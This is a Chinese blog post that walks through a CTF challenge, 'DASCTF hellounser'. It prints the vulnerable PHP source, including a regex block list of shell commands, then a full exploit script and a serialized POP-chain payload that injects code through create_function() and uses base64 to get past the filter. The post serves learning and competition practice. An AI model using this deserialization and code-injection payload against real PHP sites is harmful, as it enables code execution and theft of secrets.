@@ -1,0 +1,442 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>DASCTF hellounser - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content=" 源码
+12345678910111213141516...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">DASCTF hellounser</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/life/coffeeroom.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">DASCTF hellounser</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 25, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5401</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <p> 源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    $aaa = unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    $aaa();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="类A"><a href="#类A" class="headerlink" title="类A"></a>类A</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>类A比较简单</p>
+<p>先定义公共变量</p>
+<h6 id="PHP中的-this用法："><a href="#PHP中的-this用法：" class="headerlink" title="PHP中的$this用法："></a>PHP中的$this用法：</h6><p>this是指向当前对象的指针</p>
+<p><img   class="lazyload" data-original="/2021/09/25/2021/ctf/23/image-20210925201706608.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210925201706608"></p>
+<h6 id="invoke-函数"><a href="#invoke-函数" class="headerlink" title="__invoke()函数"></a>__invoke()函数</h6><p>当以函数方式调用对象时被调用</p>
+<h5 id="类B"><a href="#类B" class="headerlink" title="类B"></a>类B</h5><pre><code>class B&#123;
+    public $func;
+    public $arg;public function show()&#123;
+    $func = $this-&gt;func;
+    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;
+        die(&#39;No!No!No!&#39;);
+    &#125; else &#123;
+        include &quot;flag.php&quot;;
+        //There is no code to print flag in flag.php
+        $func(&#39;&#39;, $this-&gt;arg);
+    &#125;
+&#125;
+
+public function __toString()&#123;
+    $this-&gt;show();
+    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;
+&#125;
+&#125;</code></pre>
+<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>当对象为字符串时触发</p>
+<p>思路：</p>
+<p>new两个新的a类和b类变量</p>
+<p>然后b类调用create_function函数方法：</p>
+<p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。</p>
+<p>create_function()函数会在内部执行 eval()<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10816089.html">代码审计之create_function()函数 - 卿先生 - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>变量b赋值<br>}这个是为了闭合前面的<br>//这个是为了注释后面的</p>
+<p>base64绕过正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">var</span>=<span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure>
+
+<p>将b的值与a联系，触发_invoke函数从而触发show()</p>
+<p>最后再序列化a</p>
+<p>不过我们得先找到flag到底在哪个文件里：</p>
+<p>经过热心同学的帮助，今天才懂得 include flag.php 包含的意思</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css">就相当于现在<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面的变量已经同步到我现在这个<span class="hljs-selector-tag">php</span>文件里面<br><br><br><br>比如说我在1<span class="hljs-selector-class">.php</span> 写<span class="hljs-selector-tag">include</span> “<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>”<br><br><br><br>那么这个时候<br><br><br><br><span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面定义过的变量还有函数<br><br><br><br>我在1<span class="hljs-selector-class">.php</span>里面也可以用<br><br><br></code></pre></td></tr></table></figure>
+
+<p>所以在赋值时先直接打印当前php文件的变量值(也就是相当于打印flag.php里的内容)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/09/25/2021/ctf/23/image-20210926192749869.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210926192749869"></p>
+<p>放上exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br>$a=<span class="hljs-keyword">new</span> A();<br>$b=<span class="hljs-keyword">new</span> B();<br>$b-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br>$b-&gt;arg=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br>$a-&gt;var=$b;<br><span class="hljs-keyword">echo</span> serialize($a);<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>跑出pop链</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;A&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;create_function&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;&#125;&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/09/25/2021/ctf/23/image-20210925200601616.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210925200601616"></p>
+<p>之后再看看这篇文章</p>
+<p>[php反序列化之pop链_L1ni01-CSDN博客_pop链](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP链介绍</a> POP 面向属性编程 (Property-Oriented,Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是 从现有运行环境 中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链%2C最终达到攻击者邪恶的目的)</p>
+<p>经过提示知道这题和BJDCTF的ezphp很像</p>
+<h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - 博客园 (cnblogs.com)</a></p>
+<p>这一篇文章解释了前面闭合的问题:</p>
+<p><img   class="lazyload" data-original="/2021/09/25/2021/ctf/23/image-20210926202437436.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210926202437436"></p>
+<p>这样代码实际就只执行了return $arg  这一句，完成了逃逸</p>
+<p><strong>PHP 的 <code>create_function()</code> 代码注入</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L’Amore (gem-love.com)</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/09/25/2021/ctf/23/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;25&#x2F;2021&#x2F;ctf&#x2F;23&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;09&#x2F;25&#x2F;2021&#x2F;ctf&#x2F;23&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/09/28/2021/ctf/24/"><i class="iconfont iconleft"></i>MRCTF2020 wirteup</a>
+    <a href="/2021/09/07/2021/ctf/21/">2021祥云杯 secrets_of_admin&crwaler_z<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B1%BBA"><span class="toc-text">类A</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B1%BBB"><span class="toc-text">类B</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BJDCTF-Ezphp"><span class="toc-text">BJDCTF Ezphp</span></a>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
